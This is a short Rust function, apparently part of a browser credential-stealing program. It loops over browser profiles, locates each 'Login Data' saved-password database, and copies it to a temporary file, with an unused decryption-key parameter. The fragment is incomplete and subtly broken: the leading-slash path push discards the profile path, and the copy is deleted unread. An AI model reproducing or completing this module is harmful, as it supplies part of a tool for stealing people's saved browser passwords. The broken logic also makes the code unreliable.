use std::path::PathBuf;

pub(super) async fn get_login_data(
    path: &mut PathBuf,
    profiles: &Vec<String>,
    tempfile: &PathBuf,
    key: &str,
) -> std::io::Result<()> {
    for profile in profiles {
        path.push(profile);
        path.push("/Login Data");

        super::check_db_size(path).await?;

        // Copy the file to the temporary folder
        std::fs::copy(&path, tempfile).unwrap();

        std::fs::remove_file(tempfile).unwrap();
        path.pop();
        path.pop();
    }

    Ok(())
}
